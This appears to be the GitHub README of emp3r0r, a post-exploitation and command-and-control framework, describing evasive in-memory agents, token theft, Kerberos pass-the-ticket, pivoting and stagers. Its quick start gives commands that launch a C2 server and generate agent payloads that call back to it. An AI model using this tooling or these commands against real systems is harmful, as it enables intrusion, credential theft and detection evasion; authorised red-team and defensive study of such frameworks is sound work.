<img align="left" width="150" height="150" alt="emp3r0r" src="https://github.com/user-attachments/assets/65550dfb-ea5a-49e8-a036-8c7df349f5f4" />

### emp3r0r

**Self‑healing Gossip Mesh C2 with Assisted Peer Discovery, Cross-Platform BOF Execution, and Scriptable Agents.**

<br clear="all" />

[![Discord](https://img.shields.io/badge/Discord-Join%20Server-7289da?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/vU98aQtk9f)
[![GitHub Sponsors](https://img.shields.io/badge/GitHub-Sponsor-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sponsors/jm33-m0)

![GitHub go.mod Go version](https://img.shields.io/github/go-mod/go-version/jm33-m0/emp3r0r?filename=core%2Fgo.mod)
[![Tests](https://github.com/jm33-m0/emp3r0r/actions/workflows/test.yml/badge.svg)](https://github.com/jm33-m0/emp3r0r/actions/workflows/test.yml)
![GitHub License](https://img.shields.io/github/license/jm33-m0/emp3r0r)
[![GitHub release](https://img.shields.io/github/release/jm33-m0/emp3r0r.svg)](https://github.com/jm33-m0/emp3r0r/releases)

---

<img width="1908" height="1141" alt="Screenshot From 2026-08-26 14-20-24" src="https://github.com/user-attachments/assets/8952f405-2af9-4840-b57f-086498f389b8" />

## What is emp3r0r?

emp3r0r is an advanced, zero-trust post-exploitation framework and command & control (C2) system designed for Linux and Windows target environments. Built from the ground up to operate in high-security environments, emp3r0r combines **autonomous gossip mesh networking**, **fileless memory-only execution**, **cross-platform BOF loading**, **inter-agent file transfer**, and **in-memory scriptable agents** to deliver superior stealth, operational control, and operational security (OPSEC).

---

## Key Highlights & Unique Features

### 🐍 Scriptable Agents (Embedded Starlark Engine & Win32 API Proxy)

emp3r0r agents feature an embedded **Starlark scripting engine** (a Python dialect implemented purely in Go). Scripts execute filelessly in memory without requiring Python, Bash, or PowerShell installed on the target.

- **Zero Host Dependencies:** Executes standalone scripts without spawning command interpreters (`/bin/sh`, `powershell.exe`) or relying on installed runtimes.
- **Built-in Agent Go APIs:** Exposed functions for filesystem operations (`read_file`, `write_file`, `list_dir`, `mkdir`, `remove`, `exists`), HTTP networking (`http_get`, `http_post`), command execution (`exec_cmd`), and hashing (`crypto_hash`).
- **Dynamic Win32 API Proxy:** On Windows targets, Starlark scripts can dynamically load system DLLs and execute native Win32 APIs (`win_call`, `win_alloc`, `win_free`, `win_read_mem`) directly from script code without compiling native C code.
- **Modular Integration:** Starlark scripts are defined using JSON manifests (`config.json`) for seamless CLI parameter parsing and distribution.

**Why this matters:** Traditional C2 script modules require host interpreters or process spawning, leaving heavy disk or command-line execution traces. emp3r0r's scriptable agents execute complex logic entirely in memory with native system interaction.

---

### 🔐 TOFU Cryptographic Identity Pinning

emp3r0r enforces **Trust-On-First-Use (TOFU)** with strict UUID and public-key pinning upon agent enrollment.

- **Immutable Binding:** Once enrolled, an agent's UUID is pinned to its cryptographic public key. Re-enrollment with altered credentials is rejected as an impersonation attempt.
- **Controlled Reset:** De-registration requires explicit operator authorization via `forget_agent`.

**Why this matters:** Prevents session hijacking, agent cloning, and silent identity drift across operational environments.

---

### 🔒 Perfect Forward Secrecy (PFS)

All C2 and peer communications enforce **ECDH key exchange** with **HKDF-derived session keys**.

- **Ephemeral Keys:** Each session generates unique encryption keys.
- **Decoupled Security:** Compromising long-term keys or an individual agent cannot compromise past or parallel communications.

**Why this matters:** Prevents retrospective decryption of intercepted network captures.

---

### 🕸️ Autonomous P2P Gossip Mesh Network

Agents in egress-restricted or isolated network segments autonomously discover peers and tunnel traffic via a gossip-based (Memberlist) mesh network.

- **Pluggable Peer Transports:** Support for camouflage **mTLS 1.3** (using ephemeral certificates) and **KCP** (reliable UDP).
- **End-to-End Encryption:** All inter-agent mesh hops are wrapped in AES-GCM encryption.
- **Low Network Footprint:** Direct agent-to-agent relaying eliminates unnecessary broadcast noise and centralized C2 connection chokepoints.

**Why this matters:** Pivoting across segmented networks occurs autonomously without requiring constant operator intervention or static proxy setups.

---

### 📂 P2P Filesystem

Direct agent-to-agent file sharing via P2P relay transport (mTLS/KCP) to accelerate file delivery across internal networks.

- **Encrypted P2P Tunnels:** Tunnel transfers across peers using mTLS/KCP to bypass egress restrictions and reduce central C2 bandwidth bottlenecks.
- **Smart In-Memory File Caching**: Files are cached in agent memory as encrypted blobs; can be seamlessly served for other agents to download on demand. When requesting a file, agents look at their local memfs, then other peers, finally the C2.
- **Automatic C2 Relay Fallback:** If a target peer lacks the requested file, it dynamically fetches and streams it from the C2 server on demand.

**Why this matters:** Direct agent-to-agent file sharing maximizes transfer speeds, bypasses network chokepoints, and reduces direct C2 traffic visibility.

---

### 📡 Multi-Protocol Listeners & Pluggable Stagers

Flexible Stage 0 downloader stagers and protocol listeners for initial access and payload delivery.

- **Multi-Protocol Listeners:** Embedded and standalone HTTP, TCP, and UDP listeners with reliable sequence-acknowledgment framing and custom HTTP profiles. The standalone listener supports optional TLS (`-tls`), auto-generating a self-signed certificate when no cert/key pair is supplied.
- **Standalone C Downloader Stager:** Built with direct, libc-independent Linux syscalls for compatibility across distributions without symbol errors.
- **Encrypted Stage Delivery:** The listener encrypts the staged payload with RC4 using a key derived from an operator-supplied secret; the stager decrypts it in memory before reflective loading.
- **Pluggable Stager Transports:** Modular transport system allowing operators to drop in custom C transport modules (`transport_<name>.c`). Built-in freestanding options include HTTP, TCP, and UDP via raw syscalls, as well as dynamic library transports (e.g. `libcurl` via runtime symbol resolution).
  - *Benefits:* Bypasses egress filtering and network detection by seamlessly blending traffic into legitimate system channels (e.g. native `libcurl` or custom protocol implementations) without altering core stager logic.
- **Pluggable Self-Unpacking Packers:** Extensible stub and packer module interface (`pack_<name>.py` + `unpack_stub_<name>.c`). Operators can write custom packing/obfuscation algorithms (built-in options include RC4 stream encryption and greedy LZSS compression) with automatic runtime header patching.
  - *Benefits:* Breaks static AV/EDR YARA rules and signature matching by encrypting/compressing the Stage 0 payload with unique keys or algorithms, self-unpacking into read/write memory that is then flipped to read/execute before execution.
- **Tiny Payload Size:** While emp3r0r agent binaries are ~20MB without compression, this stager is 2KB; the sRDI-like payload it fetches from emp3r0r listener, is ~8MB (compressed from agent binary in ELF shared object format).
- **Flexible Formats:** Compiles into raw position-independent shellcode (`.bin`), self-unpacking packed shellcode (`packed`), standalone ELF executables, or shared objects (`.so`).
- **In-Memory Hardening:** Allocates stage memory read/write, de-obfuscates payloads, then enforces read/execute before reflective loading. The self-unpacker never maps RWX (read/write → unpack → read/execute), and mutable stager state lives in a dedicated read/write page rather than in writable code.

---

### 🧩 Native Cross-Platform BOF & PICO Support (COFF, ELF & PICO)

Execute in-memory binary modules on both Windows and Linux targets:

- **Windows COFF Loaders:** Run Windows BOF binaries filelessly with typed parameter packing (`int`, `short`, `cstr`, `wstr`, `binary`).
- **Linux ELF Object Loaders:** Load ELF relocatable object files (`.o`) directly into agent memory on Linux.
- **Crystal-Kit PICO Modules & Stack Spoofing:** Integrated PICO (Position-Independent Code Object) loaders and packers featuring SilentMoonwalk callstack desync spoofer for advanced evasion.
- **Bundled BOF Suites:** Built-in support for Kerbeus-BOF, Remote-OPs, and Situational Awareness (SA) module collections.

**Why this matters:** Eliminates process creation overhead and circumvents command-line and callstack monitoring by running compiled C modules in-process with callstack spoofing.

---

### 🔑 Windows Tokens, Netonly Sessions & Kerberos Tickets (PTT)

Agents on Windows can steal, cache and impersonate access tokens from running processes — entirely in-process via indirect NT syscalls — and can build disposable **netonly logon sessions** with imported **Kerberos tickets** for pass‑the‑ticket (PTT) operations against remote hosts.

- **Steal & Cache:** `steal_token --pid <PID>` duplicates a process token via `NtOpenProcess` + `NtDuplicateToken` and caches it by SID. Optionally chain impersonation with `--token <sid>` to escalate from one stolen identity to another.
- **Enumerate:** `list_tokens` shows every cached token as `DOMAIN/User (SID)`.
- **Netonly Logon Sessions:** `make_token --user CORP/da [--domain CORP] [--name da]` creates a netonly logon session (`LOGON32_LOGON_NEW_CREDENTIALS`, i.e. `runas /netonly`, like Cobalt Strike's `make_token`) — any password works and is never validated. The session keeps the agent's local identity and only carries the supplied credentials for **outbound** network access. `list_sessions` lists them (name, user, logon LUID); each session is addressable as `--token <session>`.
- **Kerberos Ticket Import (PTT):** `import_ticket --session <name> --ticket <base64 KRB-CRED .kirbi>` submits the ticket into that session's LSA logon-session cache via `LsaCallAuthenticationPackage` (the same primitive as Kerbeus `ptt`, no BOF needed). `--luid <hex>` targets an explicit logon session LUID (requires SYSTEM for sessions owned by other users).
- **One-shot `--user`/`--ticket` module flags:** every module also accepts `--user CORP/da` (create/reuse the session on the fly) and `--ticket <base64>` (import into it before execution), so the whole PTT setup is a single invocation.
- **Universal Impersonation:** reference a stolen-token SID or a session name via `--token <...>` in **any** module — Go, Starlark, COFF/BOF. Thread-level impersonation (`NtSetInformationThread`) is applied around sensitive operations; token-aware Starlark builtins (`read_file`, `write_file`, `exec_cmd`, the Win32 API proxy, …) impersonate per syscall, and child processes can be spawned under the identity with `CreateProcessWithTokenW`.
- **Tickets are per logon session:** an imported ticket only authenticates network traffic that runs under *its* session — that is the pass-the-ticket model. The session's network identity becomes the ticket's principal (e.g. the DA) while `whoami` still shows the original user. Use **hostnames** (not IPs) in UNC/SPN paths so Kerberos is selected, and connect to agent-less hosts over SMB/RPC with `cifs_upload`/`cifs_rm`/`scshell`. Inspect and manage caches with the bundled Kerbeus BOF suite (`kerbeus_asktgt`, `kerbeus_ptt`, `kerbeus_klist`).

**Why this matters:** no external tools, no disk artifacts, no process-creation noise. Token theft, netonly sessions and ticket imports all happen in-process via indirect syscalls and LSA; DA material is quarantined in a disposable session that can be purged, keeping the agent process's own identity clean.

---

### 🧦 SOCKS5 Pivoting & Operator-Side tun2socks

Two-layer pivoting: a **SOCKS5 pivot on the C2 that relays through the selected agent**, plus an optional **TUN device on the operator machine** that transparently routes chosen networks through that SOCKS5 pivot — so traffic appears to originate from the agent, not the operator.

- **SOCKS5 Pivot:** `target <agent>` then `socks_start 1080` binds a SOCKS5 proxy on the C2 that tunnels through the selected agent. Point any SOCKS5-aware tool at it (e.g. `proxychains: socks5 <C2 WireGuard IP> 1080`); `--bind` selects the C2 listen address. `socks_stop <port>` / `socks_status` manage running pivots.
- **tun2socks (transparent proxy):** `tun2socks start --route 10.10.0.0/24 [--route ...] [--exclude ...]` (sing-box TUN engine with a gVisor user-space network stack) creates a TUN device on the operator host and terminates only the traffic destined for the `--route` networks, re-opening it through the C2 SOCKS5 pivot — i.e. it appears to originate from the selected agent. Your default route is never touched, so normal connectivity keeps working. `tun2socks stop [name]` / `tun2socks status` manage instances; options include `--mtu`, `--addr` and `--name`.
- **Typical flow:** `target <agent>` → `socks_start 1080` → `tun2socks start --route 10.10.0.0/24` → `curl http://10.10.0.5` (or any tool) — no per-tool SOCKS5 configuration needed.

**Why this matters:** full-network access to agent-side segments (e.g. a reachable DC or workstation subnet) with tool-agnostic, operator-side transparency and agent-originated egress — no persistent agent-side listeners or static port forwards.

### 🎭 Pluggable C2 Transport, uTLS JA3 Evasion & CBOR Protocol

- **Pluggable C2 Modes:** Flexible beaconing (`http_poll`) with malleable HTTP profiles and streaming (`h2conn`) over HTTP/2.
- **JA3 Signature Randomization:** Utilizes **uTLS** to randomize TLS Client Hello fingerprints, defeating static network signatures.
- **Binary Wire Protocol:** Uses **CBOR** (Concise Binary Object Representation) for all control data and wire serialization, reducing network payload sizes by 30-40% compared to JSON.

---

### 💾 Encrypted Memory-First Storage

- **In-Memory Encrypted Virtual Filesystem:** All agent file operations use an in-memory AES-GCM virtual filesystem. Large data automatically spills to encrypted disk storage without identifiable headers or extensions.
- **P2P-Powered Smart Caching**: Each P2P-enabled agent caches the files they fetch from C2 in memfs; then makes it available for other peers, minimizing C2 traffic footprint while making use of fast inter-agent connections.

---

## Quick Start

### 1. C2 Server Installation

Building emp3r0r requires Docker or Podman on the host. No local Go toolchain is required.

```bash
# Clone repository
git clone --depth=1 https://github.com/jm33-m0/emp3r0r.git && cd emp3r0r

# Build inside a container and install locally
./install.py
```

The installer compiles the core binaries inside a throwaway container, generates the precompiled `emp3r0r-operator-kit.tar.zst`, configures required Linux capabilities (`setcap`), and sets up system runtime directories.

Options:

```bash
./install.py [--debug] [--disable-garble] [--prefix /usr/local] [--skip-build] \
  [--lightweight] [--targets linux/amd64,windows/amd64]
```

Use `--lightweight` to build only `linux/amd64` and `windows/amd64` exe/dll targets (fastest, for x86-64-only deployments), or `--targets OS/ARCH,...` to compile a specific set of payload types.

Launch the C2 server:

```bash
emp3r0r server --c2-hosts 1.2.3.4 --http-port 12345 --operator-port 13377
```

_Note: If installed with `root` user instead of standard `sudo`, your current user might not be able to launch emp3r0r as permissions can't be properly set by the installer. The same applies to your operator machines as well._

---

### 2. Operator Machine Setup

Transfer the generated `emp3r0r-operator-kit.tar.zst` to your operator machine and run the installer:

```bash
tar --zstd -xpf emp3r0r-operator-kit.tar.zst
cd ./emp3r0r-operator-kit && ./install.py
```

Connect the operator client to the C2 server using the WireGuard tunnel credentials printed by the server:

```bash
emp3r0r client --c2-port 13377 \
  --server-wg-key '<SERVER_WG_KEY>' \
  --server-wg-ip '<SERVER_WG_IP>' \
  --operator-wg-ip '<OPERATOR_WG_IP>' \
  --operator-wg-key '<OPERATOR_WG_KEY>' \
  --c2-host 1.2.3.4
```

---

### 3. Generate Agent Payloads

Use the `generate` command within the emp3r0r operator interface to create payloads.

**Direct C2 Agent:**

```bash
generate --type linux_executable --arch amd64 --cc your.domain.com
```

**Mesh Gateway Agent:**

```bash
generate --type linux_executable --arch amd64 --cc your.domain.com \
  --p2p --direct-c2 --p2p-transport mtls
```

**Mesh Intermediate Peer:**

```bash
generate --type linux_executable --arch amd64 --cc your.domain.com \
  --p2p --p2p-transport mtls --peers 1.2.3.4
```

---

## Documentation & Resources

- 📝 **Security Policy:** [SECURITY.md](./SECURITY.md)
- 📜 **Changelog:** [CHANGELOG.md](./CHANGELOG.md)
- 🛠️ **Module Development Guide:** [core/modules/module_development_guide.md](./core/modules/module_development_guide.md)

---

## Support Development

If emp3r0r has proven valuable in your security research and testing, consider supporting its continued development via [GitHub Sponsors](https://github.com/sponsors/jm33-m0).
